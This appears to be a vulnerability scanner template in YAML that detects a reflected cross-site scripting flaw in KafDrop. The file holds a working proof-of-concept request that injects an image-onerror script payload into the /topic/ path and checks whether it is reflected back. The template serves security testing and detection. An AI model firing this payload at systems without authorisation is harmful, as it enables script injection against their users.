id: kafdrop-xss
info:
  author: dhiyaneshDk
  description: A vulnerability in KafDrop allows remote unauthenticated attackers
    to inject arbitrary HTML and/or JavaScript into the response returned by the server.
  name: KafDrop - Cross-Site Scripting
  reference:
  - https://github.com/HomeAdvisor/Kafdrop/issues/12
  severity: medium
  tags: kafdrop,xss
requests:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - Kafdrop
    - <img src=x onerror=alert(2)>
  - status:
    - 500
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/topic/e''%22%3E%3Cimg%20src=x%20onerror=alert(2)%3E'
